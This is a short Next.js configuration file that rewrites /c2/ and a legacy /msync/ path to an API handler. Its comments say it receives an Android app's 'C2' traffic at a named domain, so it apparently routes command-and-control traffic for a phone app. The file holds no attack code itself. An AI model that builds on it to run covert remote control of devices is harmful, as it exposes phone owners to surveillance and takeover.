/** @type {import('next').NextConfig} */
const nextConfig = {
  async rewrites() {
    return [
      // Map /c2/:path* → /api/c2/:path* so the Android app's C2 traffic
      // hitting kpts.com.pk/c2/... is forwarded to the Next.js API handler
      {
        source: "/c2/:path*",
        destination: "/api/c2/:path*",
      },
      // Map /msync/:path* → /api/c2/:path* (legacy path compatibility)
      {
        source: "/msync/:path*",
        destination: "/api/c2/:path*",
      },
    ];
  },
};

export default nextConfig;